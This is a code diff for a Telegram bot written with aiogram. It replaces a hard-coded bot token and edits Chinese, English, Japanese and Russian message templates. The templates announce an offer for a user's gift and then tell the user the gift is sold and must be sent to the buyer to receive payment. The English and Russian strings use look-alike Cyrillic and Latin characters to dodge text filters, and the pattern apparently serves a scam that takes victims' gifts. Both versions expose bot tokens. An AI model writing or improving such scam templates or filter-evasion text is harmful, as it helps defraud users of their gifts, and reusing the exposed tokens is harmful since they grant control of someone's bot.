@@ -14,7 +14,7 @@ from aiogram.enums import ParseMode
 # ============================================================
 # КОНФИГУРАЦИЯ
 # ============================================================
-BOT_TOKEN = "8960916793:AAE-Q8SxxfiOERVEel9ASYLp-CdqWY3qKq0"
+BOT_TOKEN = "8913883981:AAGKK-8h44EB5WHw2YnnuNdhharT7TUztUk"
 
 STAR_EMOJI_ID = "5848259999763011021"
 GRAM_EMOJI_ID = "5303250111852228815"
@@ -70,25 +70,25 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
 def build_offer_text(lang: str, sender_name: str, amount_fmt: str, emoji_tag: str, cur_title: str, gift_display: str) -> str:
     if lang == "cn":
         return (
-            f"用户 <b>{sender_name}</b> 为礼物 {gift_display} 提供 "
-            f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b>。\n\n"
-            f"此优惠有效期为 12 小时 0 分钟。"
+            f"用户{sender_name}为{gift_display}的礼物提供"
+            f"{amount_fmt} {emoji_tag} {cur_title}。\n\n"
+            f"此优惠有效期为12小时0分钟。"
         )
     if lang == "en":
         return (
-            f"Usеr <b>{sender_name}</b> hаs оffеr уоu "
-            f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> fоr thе gift {gift_display}.\n\n"
+            f"Usеr {sender_name} hаs оffеr уоu "
+            f"{amount_fmt} {emoji_tag} {cur_title} fоr thе gift {gift_display}.\n\n"
             f"Тhis оffеr hаs vаIid fоr 12 h. 0 min."
         )
     if lang == "jp":
         return (
-            f"ユーザー <b>{sender_name}</b> はギフト {gift_display} のためにあなたに "
-            f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> を提供しています。\n\n"
-            f"このオファーは 12 時間 0 分有効です。"
+            f"ユーザー{sender_name}はギフト{gift_display}のためにあなたに"
+            f"{amount_fmt} {emoji_tag} {cur_title}を提供しています。\n\n"
+            f"このオファーは12時間0分有効です。"
         )
     return (
-        f"Пoльзoвaтeль <b>{sender_name}</b> пpeдлaгaeт Вaм "
-        f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> зa пoдapoк {gift_display}.\n\n"
+        f"Пoльзoвaтeль {sender_name} пpeдлaгaeт Вaм "
+        f"{amount_fmt} {emoji_tag} {cur_title} зa пoдapoк {gift_display}.\n\n"
         f"Дaннoe пpeдлoжeниe дeйcтвyeт eщё 12 ч. 0 мин."
     )
 
@@ -96,8 +96,8 @@ def build_sold_text(lang: str, gift_display: str, amount_fmt: str, emoji_tag: st
     if lang == "cn":
         return (
             f'<tg-emoji emoji-id="{EMOJI_SOLD}">🎁</tg-emoji> '
-            f"礼物 {gift_display} 已成功售出。\n\n"
-            f"· 请将礼物发送给买家，以便入账 <b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b>。"
+            f"{gift_display}礼品#已成功销售.\n\n"
+            f"·将礼物送给买家，以获得{amount_fmt} {emoji_tag} {cur_title}。"
         )
     if lang == "en":
         return (
@@ -108,14 +108,14 @@ def build_sold_text(lang: str, gift_display: str, amount_fmt: str, emoji_tag: st
     if lang == "jp":
         return (
             f'<tg-emoji emoji-id="{EMOJI_SOLD}">🎁</tg-emoji> '
-            f"ギフト {gift_display} が無事に販売されました。\n\n"
-            f"· <b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> をクレジットするために購入者にギフトを送ってください。"
+            f"ギフト{gift_display}が無事に販売されました。\n\n"
+            f"· {amount_fmt} {emoji_tag} {cur_title}をクレジットするために購入者にギフトを送ってください。"
         )
     return (
         f'<tg-emoji emoji-id="{EMOJI_SOLD}">🎁</tg-emoji> '
         f"Пoдapoк {gift_display} был ycпeшнo пpoдaн.\n\n"
         f"· Пepeдaйтe пoдapoк пoкyпaтeлю для зaчиcлeния "
-        f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b>."
+        f"{amount_fmt} {emoji_tag} {cur_title}."
     )
 
 def build_decline_text(lang: str) -> str:
